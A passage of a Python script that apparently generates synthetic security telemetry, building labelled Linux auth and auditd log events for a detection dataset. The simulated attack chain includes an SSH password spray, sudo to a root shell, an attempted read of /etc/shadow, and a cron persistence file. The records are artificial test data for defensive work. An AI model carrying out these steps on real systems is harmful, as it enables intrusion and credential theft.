    for i, (user, src_ip) in enumerate(benign_users):
        events.append({
            "log_type": "auth",
            "ts": ts(-60.0 + i * 5),
            "hostname": "SRV-DB-01",
            "program": "sshd",
            "pid": 3000 + i,
            "message": f"Accepted publickey for {user} from {src_ip} port {22100 + i} ssh2: RSA SHA256:abc{i}xyz",
            "user": user,
            "src_ip": src_ip,
            "auth_method": "publickey",
            "description": f"benign_ssh_key_login_{user}"
        })
    events.append({
        "log_type": "auth",
        "ts": ts(-55.0),
        "hostname": "SRV-DB-01",
        "program": "sudo",
        "pid": 3100,
        "message": "devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/apt-get update",
        "user": "devops",
        "src_ip": "10.20.1.22",
        "description": "benign_sudo_apt_get"
    })
    events.append({
        "log_type": "auth",
        "ts": ts(-50.0),
        "hostname": "SRV-DB-01",
        "program": "CRON",
        "pid": 3200,
        "message": "pam_unix(cron:session): session opened for user root by (uid=0)",
        "user": "root",
        "description": "benign_cron_session"
    })

    # Attack: SSH password spray from 91.214.124.88
    spray_users = ["root", "admin", "ubuntu", "deploy", "oracle", "postgres", "root", "svc_backup"]
    for i, user in enumerate(spray_users):
        prefix = "invalid user " if user not in ["root", "ubuntu", "svc_backup"] else ""
        events.append({
            "log_type": "auth",
            "ts": ts(1.0 + i * 0.15),
            "hostname": "SRV-DB-01",
            "program": "sshd",
            "pid": 4000 + i,
            "message": f"Failed password for {prefix}{user} from 91.214.124.88 port {40000 + i * 17} ssh2",
            "user": user,
            "src_ip": "91.214.124.88",
            "auth_method": "password",
            "description": f"ssh_spray_failed_{i}_{user}"
        })
    events.append({
        "log_type": "auth",
        "ts": ts(2.5),
        "hostname": "SRV-DB-01",
        "program": "sshd",
        "pid": 4100,
        "message": "Accepted password for svc_backup from 91.214.124.88 port 40999 ssh2",
        "user": "svc_backup",
        "src_ip": "91.214.124.88",
        "auth_method": "password",
        "description": "ssh_spray_successful_svc_backup"
    })

    # Attack: Privilege escalation
    events.append({
        "log_type": "auth",
        "ts": ts(3.0),
        "hostname": "SRV-DB-01",
        "program": "sudo",
        "pid": 4200,
        "message": "svc_backup : TTY=pts/1 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash",
        "user": "svc_backup",
        "src_ip": "91.214.124.88",
        "description": "sudo_escalation_to_root_bash"
    })
    events.append({
        "log_type": "auth",
        "ts": ts(3.2),
        "hostname": "SRV-DB-01",
        "program": "su",
        "pid": 4210,
        "message": "pam_unix(su-l:auth): authentication failure; logname=svc_backup uid=1005 euid=0 tty=pts/1 ruser=svc_backup rhost= user=root",
        "user": "root",
        "description": "su_auth_failure_root"
    })
    events.append({
        "log_type": "auth",
        "ts": ts(3.5),
        "hostname": "SRV-DB-01",
        "program": "sudo",
        "pid": 4220,
        "message": "pam_unix(sudo:auth): conversation failed",
        "user": "svc_backup",
        "description": "sudo_conversation_failed"
    })

    # Attack: /etc/shadow read attempt
    events.append({
        "log_type": "auditd",
        "ts": ts(4.0),
        "hostname": "SRV-DB-01",
        "type": "SYSCALL",
        "msg": "audit(1723622400.000:1001): arch=c000003e syscall=2 success=no exit=-13 items=1 ppid=4100 pid=4300 auid=1005 uid=0 gid=0 euid=0 egid=0 tty=pts1 ses=14 comm=cat exe=/bin/cat key=shadow_access",
        "syscall": "open",
        "success": "no",
        "exit": -13,
        "exe": "/bin/cat",
        "comm": "cat",
        "pid": 4300, "ppid": 4100,
        "uid": 0, "auid": 1005,
        "key": "shadow_access",
        "file_path": "/etc/shadow",
        "description": "auditd_shadow_read_attempt"
    })
    events.append({
        "log_type": "auditd",
        "ts": ts(4.01),
        "hostname": "SRV-DB-01",
        "type": "PATH",
        "msg": "audit(1723622400.010:1002): item=0 name=/etc/shadow inode=917505 dev=fd:00 mode=0100640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL",
        "name": "/etc/shadow",
        "mode": "0100640",
        "description": "auditd_shadow_path_record"
    })

    # Attack: Cron persistence
    events.append({
        "log_type": "auditd",
        "ts": ts(5.0),
        "hostname": "SRV-DB-01",
        "type": "SYSCALL",
        "msg": "audit(1723622700.000:1050): arch=c000003e syscall=2 success=yes exit=3 items=2 ppid=4100 pid=4500 auid=1005 uid=0 gid=0 euid=0 egid=0 tty=pts1 ses=14 comm=tee exe=/usr/bin/tee key=cron_write",
        "syscall": "open",
        "success": "yes",
        "exe": "/usr/bin/tee",
        "comm": "tee",
        "pid": 4500, "ppid": 4100,
        "uid": 0, "auid": 1005,
        "key": "cron_write",
        "description": "auditd_cron_file_write"
    })
    events.append({
        "log_type": "auth",
        "ts": ts(5.1),
        "hostname": "SRV-DB-01",
        "program": "CRON",
        "pid": 4510,
        "message": "crontab (root) BEGIN EDIT (svc_backup)",
        "user": "svc_backup",
        "description": "cron_edit_by_svc_backup"
    })
    events.append({
        "log_type": "auditd",
        "ts": ts(5.2),
        "hostname": "SRV-DB-01",
        "type": "PATH",
        "msg": "audit(1723622712.000:1051): item=0 name=/etc/cron.d/svc_update inode=917600 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE",
        "name": "/etc/cron.d/svc_update",
        "nametype": "CREATE",
        "description": "auditd_cron_file_created"
    })
    events.append({
        "log_type": "auditd",
        "ts": ts(3.8),
        "hostname": "SRV-DB-01",
        "type": "EXECVE",
        "msg": "audit(1723622380.000:1003): argc=3 a0=id a1=-a a2=-u",
        "exe": "/usr/bin/id",
        "comm": "id",
        "pid": 4350, "ppid": 4100,
        "uid": 0, "auid": 1005,
        "description": "auditd_id_command_execution"
    })
    events.append({
        "log_type": "auditd",
        "ts": ts(3.9),
        "hostname": "SRV-DB-01",
        "type": "EXECVE",
        "msg": "audit(1723622390.000:1004): argc=2 a0=uname a1=-a",
        "exe": "/usr/bin/uname",
        "comm": "uname",
        "pid": 4360, "ppid": 4100,
        "uid": 0, "auid": 1005,
        "description": "auditd_uname_command_execution"
    })

    return events


# ===========================================================================
# MAIN
# ===========================================================================

def main():
    print("[*] Cyberion ThreatShield Telemetry Generator starting...")

    win_events = build_windows_events()
    with open(WIN_OUT, "w", encoding="utf-8") as fh:
        json.dump(win_events, fh, indent=2)
    print(f"[+] Windows dataset  : {WIN_OUT}")
    print(f"    Events           : {len(win_events)}")

    zeek_events = build_zeek_events()
    with open(ZEEK_OUT, "w", encoding="utf-8") as fh:
        json.dump(zeek_events, fh, indent=2)
    print(f"[+] Zeek dataset     : {ZEEK_OUT}")
    print(f"    Events           : {len(zeek_events)}")

    linux_events = build_linux_events()
    with open(LINUX_OUT, "w", encoding="utf-8") as fh:
        json.dump(linux_events, fh, indent=2)
    print(f"[+] Linux dataset    : {LINUX_OUT}")
    print(f"    Events           : {len(linux_events)}")

    total = len(win_events) + len(zeek_events) + len(linux_events)
    print(f"\n[*] All datasets generated. Total events: {total}")


if __name__ == "__main__":
    main()
